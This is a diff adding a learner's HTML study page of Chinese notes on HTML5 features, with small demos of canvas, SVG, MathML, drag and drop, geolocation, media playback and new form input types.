@@ -1,0 +1,1881 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+ <!-- <meta http-equiv="refresh" content="30"/> <!--每1秒中刷新当前页面 方便更新-->
+ <link rel="stylesheet" href="../css/amazeui.min.css"/>
+
+ <script type="text/javascript" src="../js/jquery-3.1.1.slim.min.js"></script>
+ <!--完美的Shiv解决方案-->
+<!--[if lt IE 9]>
+  <script src="http://cdn.static.runoob.com/libs/html5shiv/3.7/html5shiv.min.js"></script>
+<![endif]--> 
+<style>
+    body
+    {
+        color: #dddddd;
+        background-color: #333333
+    }
+</style>
+
+<title>DuGu的HTML5学习过程</title>
+</head>
+ 
+<body>
+    <!--HTML5 教程-->
+    <h3>HTML5 简介</h3>
+    <p>HTML5是HTML最新的修订版本，2014年10月由万维网联盟（W3C）完成标准制定。
+            HTML5的设计目的是为了在移动设备上支持多媒体。
+            HTML5 简单易学。
+    </p>
+    <hr>
+    <h3>什么是 HTML5?</h3>
+    <p>HTML5 是下一代 HTML 标准。
+            HTML , HTML 4.01的上一个版本诞生于 1999 年。自从那以后，Web 世界已经经历了巨变。
+            HTML5 仍处于完善之中。然而，大部分现代浏览器已经具备了某些 HTML5 支持。    
+    </p>
+    <hr>
+    <h3>
+            HTML5 是如何起步的？
+    </h3>
+    HTML5 是 W3C 与 WHATWG 合作的结果,WHATWG 指 Web Hypertext Application Technology Working Group。<br>
+    WHATWG 致力于 web 表单和应用程序，而 W3C 专注于 XHTML 2.0。在 2006 年，双方决定进行合作，来创建一个新版本的 HTML。<br>
+    HTML5 中的一些有趣的新特性：<br>
+    -- 用于绘画的 canvas 元素<br>
+    -- 用于媒介回放的 video 和 audio 元素<br>
+    -- 对本地离线存储的更好的支持<br>
+    -- 新的特殊内容元素，比如 article、footer、header、nav、section<br>
+    -- 新的表单控件，比如 calendar、date、time、email、url、search<br>
+    <hr>
+    <h3>HTML5 <!DOCTYPE></h3>
+    <!doctype> 声明必须位于 HTML5 文档中的第一行,使用非常简单:<br>
+    <hr>
+    <i>注意：对于中文网页需要使用 meta charset="utf-8" 声明编码，否则会出现乱码。</i>
+    <h3>HTML5的改进</h3>
+    -- 新元素<br>
+    -- 新属性<br>
+    -- 完全支持 CSS3 <br>
+    -- Video 和 Audio<br>
+    -- 2D/3D 制图<br>
+    -- 本地存储<br>
+    -- 本地 SQL 数据<br>
+    -- Web 应用<br>
+    <br>
+    <hr>
+    <h3>HTML5 多媒体</h3>
+    使用 HTML5 你可以简单的在网页中播放 视频(video)与音频 (audio) 。
+    -- HTML5 &lt;video&gt;<br>
+    -- HTML5 &lt;audio&gt;<br>
+    <h3>HTML5 应用</h3>
+    使用 HTML5 你可以简单地开发应用
+    -- 本地数据存储<br>
+    -- 访问本地文件<br>
+    -- 本地 SQL 数据<br>
+    -- 缓存引用<br>
+    -- Javascript 工作者<br>
+    -- XHTMLHttpRequest 2<br>
+    <br><hr>
+    <h3>HTML5 使用 CSS3</h3>
+    -- 新选择器<br>
+    -- 新属性<br>
+    -- 动画<br>
+    -- 2D/3D 转换<br>
+    -- 圆角<br>
+    -- 阴影效果 <br>
+    -- 可下载的字体<br>
+  <br><hr>
+  <h3>语义元素</h3>
+  HTML5 添加了很多语义元素如下所示：
+  <table class="am-table am-table-bordered am-table-radius"><tbody><tr><th>标签
+    </th><th>描述
+    </th></tr><tr><td>&lt;article&gt;
+    </td><td>定义页面独立的内容区域。
+    </td></tr><tr><td>&lt;aside&gt;
+    </td><td>定义页面的侧边栏内容。
+    </td></tr><tr><td>&lt;bdi&gt;
+    </td><td>允许您设置一段文本，使其脱离其父元素的文本方向设置。
+    </td></tr><tr><td>&lt;command&gt;
+    </td><td>定义命令按钮，比如单选按钮、复选框或按钮
+    </td></tr><tr><td>&lt;details&gt;
+    </td><td>用于描述文档或文档某个部分的细节
+    </td></tr><tr><td>&lt;dialog&gt;
+    </td><td>定义对话框，比如提示框
+    </td></tr><tr><td>&lt;summary&gt;
+    </td><td>标签包含 details 元素的标题
+    </td></tr><tr><td>&lt;figure&gt;
+    </td><td>规定独立的流内容（图像、图表、照片、代码等等）。
+    </td></tr><tr><td>&lt;figcaption&gt;
+    </td><td>定义 &lt;figure&gt; 元素的标题
+    </td></tr><tr><td>&lt;footer&gt;
+    </td><td>定义 section 或 document 的页脚。
+    </td></tr><tr><td>&lt;header&gt;
+    </td><td>定义了文档的头部区域
+    </td></tr><tr><td>&lt;mark&gt;
+    </td><td>定义带有记号的文本。
+    </td></tr><tr><td>&lt;meter&gt;
+    </td><td>定义度量衡。仅用于已知最大和最小值的度量。
+    </td></tr><tr><td>&lt;nav&gt;
+    </td><td>定义导航链接的部分。
+    </td></tr><tr><td>&lt;progress&gt;
+    </td><td>定义任何类型的任务的进度。
+    </td></tr><tr><td>&lt;ruby&gt;
+    </td><td>定义 ruby 注释（中文注音或字符）。
+    </td></tr><tr><td>&lt;rt&gt;
+    </td><td>定义字符（中文注音或字符）的解释或发音。
+    </td></tr><tr><td>&lt;rp&gt;
+    </td><td>在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。
+    </td></tr><tr><td>&lt;section&gt;
+    </td><td>定义文档中的节（section、区段）。
+    </td></tr><tr><td>&lt;time&gt;
+    </td><td>定义日期或时间。
+    </td></tr><tr><td>&lt;wbr&gt;
+    </td><td>规定在文本中的何处适合添加换行符。
+    </td></tr></tbody></table>
+    <h2>HTML5 表单</h2>
+    <p>新表单元素, 新属性，新输入类型，自动验证。</p>
+    <hr>
+    <h2>已移除元素</h2>
+    <p>以下的 HTML 4.01 元素在HTML5中已经被删除:</p>
+    <ul><li>&lt;acronym&gt;
+    </li><li>&lt;applet&gt;
+    </li><li>&lt;basefont&gt;
+    </li><li>&lt;big&gt;
+    </li><li>&lt;center&gt;
+    </li><li>&lt;dir&gt;
+    </li><li>&lt;font&gt;
+    </li><li>&lt;frame&gt;
+    </li><li>&lt;frameset&gt;
+    </li><li>&lt;noframes&gt;
+    </li><li>&lt;strike&gt;
+    </li></ul>
+    <hr>
+     <!--end HTML5 教程-->
+
+    <!--HTML5 浏览器支持-->
+
+    <h3>HTML5 浏览器支持</h3>
+    现代的浏览器都支持 HTML5。<br>
+    此外，所有浏览器，包括旧的和最新的，对无法识别的元素会作为内联元素自动处理。<br>
+    正因为如此，你可以 "<b>教会</b>" 浏览器处理 "<b>未知</b>" 的 HTML 元素。<br>
+
+    <br><b style="text-align:center">学习到了 HTML5 浏览器支持</b>.<br>
+    为了能让旧版本的浏览器正确显示这些元素，你可以设置 CSS 的 display 属性值为 block:<br>
+    <style>
+            myHero {
+                display: block;
+                background-color:#222;
+                padding: 50px;
+                font-size: 30px;
+            }
+            </style> 
+            <h1>我的第一个标题</h1>
+            
+           <p>我的第一个段落。</p>
+            
+           <myHero>我的第一个新元素</myHero>
+
+           <article>
+                This is an article
+            </article>
+
+    <!--END HTML5 浏览器支持-->
+
+    <!--HTML5 新元素-->
+
+<br>
+
+<h1>HTML5 <span class="color_h1">新元素</span>
+</h1>
+<hr>
+<h2>HTML5 新元素</h2>
+<p>自1999年以后HTML 4.01 已经改变了很多,今天，在HTML 4.01中的几个已经被废弃，这些元素在HTML5中已经被删除或重新定义。</p>
+
+<p>为了更好地处理今天的互联网应用，HTML5添加了很多新元素及功能，比如:
+图形的绘制，多媒体内容，更好的页面结构，更好的形式
+处理，和几个api拖放元素，定位，包括网页
+应用程序缓存，存储，网络工作者，等。</p>
+<hr>
+<h2> &lt;canvas&gt; 新元素</h2>
+<table class="am-table am-table-bordered am-table-radius">
+<tbody><tr>
+<th width="110" align="left">标签</th>
+<th align="left">描述</th>
+</tr>
+<tr>
+<td><a href="/tags/tag-canvas.html">&lt;canvas&gt;</a></td>
+<td> 标签定义图形，比如图表和其他图像。该标签基于 JavaScript 的绘图 API</td>
+</tr>
+</tbody></table>
+<br><hr>
+<h2>新多媒体元素</h2>
+<table class="am-table am-table-bordered am-table-radius">
+<tbody><tr>
+<th width="110" align="left">标签</th>
+<th align="left">描述</th>
+</tr>
+<tr>
+<td><a href="/tags/tag-audio.html">&lt;audio&gt;</a></td>
+<td>定义音频内容</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-video.html">&lt;video&gt;</a></td>
+<td>定义视频（video 或者 movie）</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-source.html">&lt;source&gt;</a></td>
+<td>定义多媒体资源 &lt;video&gt; 和 &lt;audio&gt;</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-embed.html">&lt;embed&gt;</a></td>
+<td>定义嵌入的内容，比如插件。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-track.html">&lt;track&gt;</a></td>
+<td>为诸如 &lt;video&gt; 和 &lt;audio&gt; 元素之类的媒介规定外部文本轨道。</td>
+</tr>
+</tbody></table>
+<br><hr>
+<h2>新表单元素</h2>
+<table class="am-table am-table-bordered am-table-radius">
+<tbody><tr>
+<th width="110" align="left">标签</th>
+<th align="left">描述</th>
+</tr>
+<tr>
+<td><a href="/tags/tag-datalist.html">&lt;datalist&gt;</a></td>
+<td>定义选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-keygen.html">&lt;keygen&gt;</a></td>
+<td>规定用于表单的密钥对生成器字段。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-output.html">&lt;output&gt;</a></td>
+<td>定义不同类型的输出，比如脚本的输出。</td>
+</tr>
+</tbody></table>
+<br><hr>
+<h2>新的语义和结构元素</h2>
+<p>HTML5提供了新的元素来创建更好的页面结构：</p>
+<table class="am-table am-table-bordered am-table-radius">
+<tbody><tr>
+<th width="110" align="left">标签</th>
+<th align="left">描述</th>
+</tr>
+<tr>
+<td><a href="/tags/tag-article.html">&lt;article&gt;</a></td>
+<td>定义页面独立的内容区域。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-aside.html">&lt;aside&gt;</a></td>
+<td>定义页面的侧边栏内容。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-bdi.html">&lt;bdi&gt;</a></td>
+<td>允许您设置一段文本，使其脱离其父元素的文本方向设置。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-command.html">&lt;command&gt;</a></td>
+<td>定义命令按钮，比如单选按钮、复选框或按钮</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-details.html">&lt;details&gt;</a></td>
+<td>用于描述文档或文档某个部分的细节</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-dialog.html">&lt;dialog&gt;</a></td>
+<td>定义对话框，比如提示框</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-summary.html">&lt;summary&gt;</a></td>
+<td>标签包含 details 元素的标题</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-figure.html">&lt;figure&gt;</a></td>
+<td>规定独立的流内容（图像、图表、照片、代码等等）。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-figcaption.html">&lt;figcaption&gt;</a></td>
+<td>定义 &lt;figure&gt; 元素的标题</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-footer.html">&lt;footer&gt;</a></td>
+<td>定义 section 或 document 的页脚。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-header.html">&lt;header&gt;</a></td>
+<td>定义了文档的头部区域</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-mark.html">&lt;mark&gt;</a></td>
+<td>定义带有记号的文本。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-meter.html">&lt;meter&gt;</a></td>
+<td>定义度量衡。仅用于已知最大和最小值的度量。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-nav.html">&lt;nav&gt;</a></td>
+<td>定义导航链接的部分。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-progress.html">&lt;progress&gt;</a></td>
+<td>定义任何类型的任务的进度。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-ruby.html">&lt;ruby&gt;</a></td>
+<td>定义 ruby 注释（中文注音或字符）。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-rt.html">&lt;rt&gt;</a></td>
+<td>定义字符（中文注音或字符）的解释或发音。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-rp.html">&lt;rp&gt;</a></td>
+<td>在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-section.html">&lt;section&gt;</a></td>
+<td>定义文档中的节（section、区段）。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-time.html">&lt;time&gt;</a></td>
+<td>定义日期或时间。</td>
+</tr>
+<tr>
+<td><a href="/tags/tag-wbr.html">&lt;wbr&gt;</a></td>
+<td>规定在文本中的何处适合添加换行符。</td>
+</tr>
+</tbody></table>
+<br><hr>
+<h2>已移除的元素</h2>
+<p>以下的 HTML 4.01 元素在HTML5中已经被删除:</p>
+<ul>
+<li>&lt;acronym&gt;</li>
+	<li>&lt;applet&gt;</li>
+	<li>&lt;basefont&gt;</li>
+	<li>&lt;big&gt;</li>
+	<li>&lt;center&gt;</li>
+	<li>&lt;dir&gt;</li>
+	<li>&lt;font&gt;</li>
+	<li>&lt;frame&gt;</li>
+	<li>&lt;frameset&gt;</li>
+	<li>&lt;noframes&gt;</li>
+	<li>&lt;strike&gt;</li>
+	<li>&lt;tt&gt;</li>
+</ul>			
+			
+</div>
+
+    <!--END HTML5 新元素-->
+
+    <!--HTML5 Canvas-->
+
+    <h2>什么是 Canvas?</h2>
+    <p> HTML5 &lt;canvas&gt; 元素用于图形的绘制，通过脚本 (通常是JavaScript)来完成.</p>
+    <p>&lt;canvas&gt; 标签只是图形容器，您必须使用脚本来绘制图形。</p>
+    <p>你可以通过多种方法使用Canva绘制路径,盒、圆、字符以及添加图像。</p>
+    <canvas id="myCanvas" width="200" height="200" ></canvas> 
+    <script>
+        {
+            canvas = document.getElementById("myCanvas") as HTMLCanvasElement;
+            var ctx = canvas.getContext("2d");
+            HTMLCanvasElement
+            ctx.beginPath();
+            ctx.arc(40,40,40,0,2*Math.PI);
+            ctx.stroke();
+            ctx.fillStyle="#123456";
+            ctx.font="30px Arial";
+            ctx.fillText("Hello World",10,50);
+            
+        }
+    </script>
+
+    <!--END HTML5 Canvas-->
+    
+     <!--HTML5 内联SVG-->
+     HTML5 支持内联 SVG。
+     <h2>什么是SVG？</h2>
+     <ul>
+         <li>SVG 指可伸缩矢量图形 (Scalable Vector Graphics)</li>
+         <li>SVG 用于定义用于网络的基于矢量的图形</li>
+         <li>SVG 使用 XML 格式定义图形</li>
+         <li>SVG 图像在放大或改变尺寸的情况下其图形质量不会有损失</li>
+         <li>SVG 是万维网联盟的标准</li>
+     </ul>
+     <hr>
+     <hr>
+     <h2>SVG优势</h2>
+     <p>与其他图像格式相比（比如 JPEG 和 GIF），使用 SVG 的优势在于：</p>
+     <ul>
+         <li>SVG 图像可通过文本编辑器来创建和修改</li>
+         <li>SVG 图像可被搜索、索引、脚本化或压缩</li>
+         <li>SVG 是可伸缩的</li>
+         <li>SVG 图像可在任何的分辨率下被高质量地打印</li>
+         <li>SVG 可在图像质量不下降的情况下被放大</li>
+     </ul>
+     <hr>
+     <h2>浏览器支持</h2>
+     Internet Explorer 9+, Firefox, Opera, Chrome, 和 Safari 支持内联SVG。
+     <svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="190">
+        <polygon points="100,10 40,180 190,60 10,60 160,180"
+        style="fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;">
+      </svg>
+      <hr>
+      <h2>SVG 与 Canvas两者间的区别</h2>
+      <p>SVG 是一种使用 XML 描述 2D 图形的语言。</p>
+      
+      <p>Canvas 通过 JavaScript 来绘制 2D 图形。</p>
+      <p>SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。</p>
+      <p>在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。</p>
+      <p>Canvas 是逐像素进行渲染的。在 canvas 中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。</p>
+      <hr>
+
+      <h2>Canvas 与 SVG 的比较</h2>
+      <p>下表列出了 canvas 与 SVG 之间的一些不同之处。</p>
+      <table class="am-table am-table-bordered am-table-radius">
+      <tbody><tr>
+      <th width="50%" align="left">Canvas</th>
+      <th width="50%" align="left">SVG</th>
+      </tr>
+      <tr>
+      <td>
+      <ul>
+          <li>依赖分辨率</li>
+          <li>不支持事件处理器</li>
+          <li>弱的文本渲染能力</li>
+          <li>能够以 .png 或 .jpg 格式保存结果图像</li>
+          <li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li>
+          </ul>
+      </td><td>
+      <ul>
+          <li>不依赖分辨率</li>
+          <li>支持事件处理器</li>
+          <li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li>
+          <li>复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快）</li>
+          <li>不适合游戏应用</li>
+        </ul>
+    </td>
+    </tr>
+    </tbody></table>	
+    <!--END HTML5 内联SVG-->
+
+    <!--HTML5 MathML-->
+
+    <math xmlns="http://www.w3.org/1998/Math/MathML">
+		
+         <mrow>
+            <msup><mi>a</mi><mn>2</mn></msup>
+            <mo>+</mo>
+				
+            <msup><mi>b</mi><mn>2</mn></msup>
+            <mo>=</mo>
+				
+            <msup><mi>c</mi><mn>2</mn></msup>
+         </mrow>
+			
+      </math>
+      <br>
+      <math xmlns="http://www.w3.org/1998/Math/MathML">
+		
+         <mrow>			
+            <mrow>
+				
+               <msup>
+                  <mi>x</mi>
+                  <mn>2</mn>
+               </msup>
+					
+               <mo>+</mo>
+					
+               <mrow>
+                  <mn>4</mn>
+                  <mo>⁢</mo>
+                  <mi>x</mi>
+               </mrow>
+					
+               <mo>+</mo>
+               <mn>4</mn>
+					
+            </mrow>
+				
+            <mo>=</mo>
+            <mn>0</mn>
+				 
+         </mrow>
+      </math>
+      <br>
+      <math xmlns="http://www.w3.org/1998/Math/MathML">
+		
+         <mrow>
+            <mi>A</mi>
+            <mo>=</mo>
+			
+            <mfenced open="[" close="]">
+			
+               <mtable>
+                  <mtr>
+                     <mtd><mi>x</mi></mtd>
+                     <mtd><mi>y</mi></mtd>
+                  </mtr>
+					
+                  <mtr>
+                     <mtd><mi>z</mi></mtd>
+                     <mtd><mi>w</mi></mtd>
+                  </mtr>
+               </mtable>
+               
+            </mfenced>
+         </mrow>
+      </math>
+      <hr>
+    <!--END HTML5 MathML-->
+
+    <!--HTML5 拖放-->
+
+    <script>
+        function allowDrop(ev)
+        {
+            ev.preventDefault();
+        }
+         
+        function drag(ev)
+        {
+            ev.dataTransfer.setData("Text",ev.target.id);
+        }
+         
+        function drop(ev)
+        {
+            ev.preventDefault();
+            var data=ev.dataTransfer.getData("Text");
+            ev.target.appendChild(document.getElementById(data));
+    
+            var div1 = document.getElementById("div1");
+            div1.style.height= "200px";
+
+        }
+    </script>
+
+    <style>
+        #div1 {width:350px;height:70px;padding:10px;border:1px solid #aaaaaa;}
+    </style>
+
+    <p>拖动 RUNOOB.COM 图片到矩形框中:</p>
+
+    <div id="div1" ondrop="drop(event)" ondragover="allowDrop(event)"></div>
+    <br>
+    <img id="drag1" src="../res/1.jpg" draggable="true" ondragstart="drag(event)" width="200" height="169">
+    <hr>
+
+    <!--END HTML5 拖放-->
+
+    <!--HTML5 Geolocation（地理定位）-->
+    <p id="demo">点击按钮获取您当前坐标（可能需要比较长的时间获取）：</p>
+    <button style="color: black;" onclick="getLocation()">点我</button>
+    <script>
+    var x=document.getElementById("demo");
+    function getLocation()
+    {
+        x.innerHTML="正在获取...";
+        if (navigator.geolocation)
+        {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        }
+        else
+        {
+            x.innerHTML="该浏览器不支持获取地理位置。";
+        }
+    }
+    
+    function showPosition(position)
+    {
+        x.innerHTML="纬度: " + position.coords.latitude + 
+        "<br>经度: " + position.coords.longitude;	
+    }
+    </script>
+    <hr>
+
+    <!--END HTML5 Geolocation（地理定位）-->
+
+    <!--HTML5 Video(视频)-->
+
+    <h3>Web站点上的视频</h3>
+    <p>直到现在，仍然不存在一项旨在网页上显示视频的标准。</p>
+    <p>今天，大多数视频是通过插件（比如 Flash）来显示的。然而，并非所有浏览器都拥有同样的插件。</p>
+    <p>HTML5 规定了一种通过 video 元素来包含视频的标准方法。</p>
+    <p><b>注意: </b>Internet Explorer 8 或者更早的IE版本不支持 &lt;video&gt; 元素。</p>
+
+
+    <video width="420" height="240" id="video1">
+        <source src="../video/badapple.mp4" type="video/mp4">
+      您的浏览器不支持Video标签。
+    </video>
+    <style>
+        button{color: black}
+    </style>
+    <button onclick="playPause()">播放/暂停</button> 
+    <button onclick="makeBig()">放大</button>
+    <button onclick="makeSmall()">缩小</button>
+    <button onclick="makeNormal()">普通</button>
+    
+    <script> 
+        var myVideo=document.getElementById("video1"); 
+        function playPause()
+        { 
+            if (myVideo.paused) 
+              myVideo.play(); 
+            else 
+              myVideo.pause(); 
+        } 
+        
+            function makeBig()
+        { 
+            myVideo.width=560; 
+        } 
+        
+            function makeSmall()
+        { 
+            myVideo.width=320; 
+        } 
+        
+            function makeNormal()
+        { 
+            myVideo.width=420; 
+        } 
+        </script> 
+        
+
+    <p>&lt;video&gt; 元素支持多个 &lt;source&gt; 元素. &lt;source&gt;  元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式：</p>
+    <hr>
+    <h2>视频格式与浏览器的支持</h2>
+    <p>当前， &lt;video&gt; 元素支持三种视频格式： MP4, WebM, 和 Ogg:</p>
+    <table class="am-table am-table-bordered am-table-radius">
+    <tbody><tr>
+    <th style="width:25%">浏览器</th>
+    <th style="width:25%">MP4</th>
+    <th style="width:25%">WebM</th>
+    <th style="width:25%">Ogg</th>
+    </tr>
+    <tr>
+    <td>Internet Explorer</td>
+    <td>YES</td>
+    <td>NO</td>
+    <td>NO</td>
+    </tr>
+    <tr>
+    <td>Chrome</td>
+    <td>YES</td>
+    <td>YES</td>
+    <td>YES</td>
+    </tr>
+    <tr>
+    <td>Firefox</td>
+    <td>YES</td>
+    <td>YES</td>
+    <td>YES</td>
+    </tr>
+    <tr>
+    <td>Safari</td>
+    <td>YES</td>
+    <td>NO</td>
+    <td>NO</td>
+    </tr>
+    <tr>
+    <td>Opera</td>
+    <td>YES (从 Opera 25 起)</td>
+    <td>YES</td>
+    <td>YES</td>
+    </tr>
+    </tbody></table>
+    <ul>
+    <li>MP4 = 带有 H.264 视频编码和 AAC 音频编码的 MPEG 4 文件</li>
+        <li>WebM = 带有 VP8 视频编码和 Vorbis 音频编码的 WebM 文件</li>
+        <li>Ogg = 带有 Theora 视频编码和 Vorbis 音频编码的 Ogg 文件</li>
+    </ul>
+    <hr>
+    <h2>视频格式</h2>
+    <table class="am-table am-table-bordered am-table-radius" id="table1">
+    <tbody><tr>
+    <th width="50%">格式</th>
+    <th width="50%">MIME-type</th>
+    </tr>
+    <tr>
+    <td>MP4</td>
+    <td>video/mp4</td>
+    </tr>
+    <tr>
+    <td>WebM</td>
+    <td>video/webm</td>
+    </tr>
+    <tr>
+    <td>Ogg</td>
+    <td>video/ogg</td>
+    </tr>
+    </tbody></table>
+    <!--END HTML5 Video(视频)-->
+    
+    <!--HTML5 Audio(音频)-->
+
+    <h3>
+            互联网上的音频
+    </h3>
+    <p>直到现在，仍然不存在一项旨在网页上播放音频的标准。</p>
+    <p>今天，大多数音频是通过插件（比如 Flash）来播放的。然而，并非所有浏览器都拥有同样的插件。</p>
+    <p>HTML5 规定了在网页上嵌入音频元素的标准，即使用 <audio> 元素。</p>
+        <h2>浏览器支持</h2>
+        <p>
+        <p>Internet Explorer 9+, Firefox, Opera, Chrome, 和 Safari 都支持 &lt;audio&gt; 元素.</p>
+        <p><b>注意:</b> Internet Explorer 8 及更早IE版本不支持 &lt;audio&gt; 元素.</p>
+
+        <p>control 属性供添加播放、暂停和音量控件。</p>
+        <p>在&lt;audio&gt; 与 &lt;/audio&gt; 之间你需要插入浏览器不支持的&lt;audio&gt;元素的提示文本 。</p>
+        <p> &lt;audio&gt; 元素允许使用多个 &lt;source&gt; 元素. &lt;source&gt; 元素可以链接不同的音频文件，浏览器将使用第一个支持的音频文件</p>
+
+        <h2>音频格式及浏览器支持</h2>
+        <p>目前, &lt;audio&gt;元素支持三种音频格式文件: MP3, Wav, 和 Ogg:</p>
+        <table class="am-table am-table-bordered am-table-radius">
+        <tbody><tr>
+        <th width="25%" align="left">浏览器</th>
+        <th width="25%" align="left">MP3</th>
+        <th width="25%" align="left">Wav</th>
+        <th width="25%" align="left">Ogg</th>
+        </tr>
+        <tr>
+        <td>Internet Explorer 9+</td>
+        <td>YES</td>
+        <td>NO</td>
+        <td>NO</td>
+        </tr>
+        <tr>
+        <td>Chrome 6+</td>
+        <td>YES</td>
+        <td>YES</td>
+        <td>YES</td>
+        </tr>
+        <tr>
+        <td>Firefox 3.6+</td>
+        <td>YES</td>
+        <td>YES</td>
+        <td>YES</td>
+        </tr>
+        <tr>
+        <td>Safari 5+</td>
+        <td>YES</td>
+        <td>YES</td>
+        <td>NO</td>
+        </tr>
+        <tr>
+        <td>Opera 10+</td>
+        <td>YES</td>
+        <td>YES</td>
+        <td>YES</td>
+        </tr>
+        <style>
+            hr
+            {
+                color: aqua;
+                background-color: aqua;
+                outline-color: aqua;
+                border: 1px dashed aqua;
+            }
+        </style>
+        </tbody></table><hr>
+        <h2>音频格式的MIME类型</h2>
+        <table class="am-table am-table-bordered am-table-radius">
+        <tbody><tr>
+        <th width="50%" align="left">Format</th>
+        <th width="50%" align="left">MIME-type</th>
+        </tr>
+        <tr>
+        <td>MP3</td>
+        <td>audio/mpeg</td>
+        </tr>
+        <tr>
+        <td>Ogg</td>
+        <td>audio/ogg</td>
+        </tr>
+        <tr>
+        <td>Wav</td>
+        <td>audio/wav</td>
+        </tr>
+        </tbody></table>
+        <hr>
+        <h2>HTML5 Audio 标签</h2>
+        
+        <table class="am-table am-table-bordered am-table-radius">
+        <tbody><tr>
+        <th width="150" align="left">标签</th>
+        <th align="left">描述</th>
+        </tr>
+        <tr>
+        <td><a href="/tags/tag-audio.html">&lt;audio&gt;</a></td>
+        <td>定义了声音内容</td>
+        </tr>
+        <tr>
+        <td><a href="/tags/tag-source.html">&lt;source&gt;</a></td>
+        <td>规定了多媒体资源, 可以是多个，在 &lt;video&gt; 与 
+        &lt;audio&gt;标签中使用</td>
+        </table>
+
+        <p>用法与Video差不多</p>
+
+    <!--END HTML5 Audio(音频)-->
+
+    <!--HTML5 Input类型-->
+    <h2>HTML5 新的 Input 类型</h2>
+    <p>HTML5 拥有多个新的表单输入类型。这些新特性提供了更好的输入控制和验证。</p>
+    <p>本章全面介绍这些新的输入类型：</p>
+    <ul>
+        <li>color</li>
+        <li>date</li>
+        <li>datetime</li>
+        <li>datetime-local</li>
+        <li>email</li>
+        <li>month</li>
+        <li>number</li>
+        <li>range</li>
+        <li>search</li>
+        <li>tel</li>
+        <li>time</li>
+        <li>url</li>
+        <li>week</li>
+    </ul>
+    <p><b>注意:</b>并不是所有的主流浏览器都支持新的input类型，不过您已经可以在所
+        有主流的浏览器中使用它们了。即使不被支持，仍然可以显示为常规的文本域。</p>
+
+        <style>
+            input 
+            { 
+                color: black
+                }
+        </style>
+        <form action="demo-form.php">
+                选择你喜欢的颜色: <input type="color" name="favcolor"><br>
+                生日: <input type="date" name="bday"><br>
+                生日 (日期和时间): <input type="datetime" name="bdaytime"><br>
+                E-mail: <input type="email" name="usremail"><br>
+                生日 ( 月和年 ): <input type="month" name="bdaymonth"><br>
+                数量 ( 1 到 5 之间): <input type="number" name="quantity" min="1" max="5"><br>
+                Points: <input type="range" name="points" min="1" max="10"><br>
+                Search Google: <input type="search" name="googlesearch"><br>
+                电话号码: <input type="tel" name="usrtel"><br>
+                选择时间: <input type="time" name="usr_time"><br>
+                添加您的主页: <input type="url" name="homepage"><br>
+                选择周: <input type="week" name="week_year"><br>
+                <input type="submit">
+
+        </form>
+        <p><b>注意:</b> Internet Explorer 9  及更早 IE 版本不支持 type="email" 。</p>
+
+        
+    <!--END HTML5 Input类型-->
+
+    <!--HTML5 表单元素-->
+
+    <h2>HTML5 新的表单元素</h2>
+    <p>HTML5 有以下新的表单元素:</p>
+    <ul>
+    <li>&lt;datalist&gt;</li>
+        <li>&lt;keygen&gt;</li>
+        <li>&lt;output&gt;</li>
+    </ul>
+    <p><b>注意:</b>不是所有的浏览器都支持HTML5 新的表单元素，但是你可以在使用它们，即使浏览器不支持表单属性，仍然可以显示为常规的表单元素。</p>
+    <hr>
+    <h2>HTML5 &lt;datalist&gt; 元素</h2>
+    <p>&lt;datalist&gt; 元素规定输入域的选项列表。 </p>
+    <p>&lt;datalist&gt;  属性规定 form 或 input 域应该拥有自动完成功能。当用户在自动完成域中开始输入时，浏览器应该在该域中显示填写的选项：</p>
+    <p>使用 &lt;input&gt; 元素的列表属性与 &lt;datalist&gt; 元素绑定.</p>
+
+    <form action="demo-form.php" method="get">
+            <input list="browsers" name="browser">
+            <datalist id="browsers">
+              <option value="Internet Explorer">
+              <option value="Firefox">
+              <option value="Chrome">
+              <option value="Opera">
+              <option value="Safari">
+            </datalist>
+            <input type="submit">
+            </form>   
+            <p><strong>注意:</strong> Internet Explorer 9（更早 IE 版本），Safari 不支持 datalist 标签。</p>
+
+            <h2>HTML5 &lt;keygen&gt; 元素</h2>
+            <p>&lt;keygen&gt; 元素的作用是提供一种验证用户的可靠方法。 </p>
+            <p>&lt;keygen&gt;标签规定用于表单的密钥对生成器字段。</p>
+            <p>当提交表单时，会生成两个键，一个是私钥，一个公钥。</p>
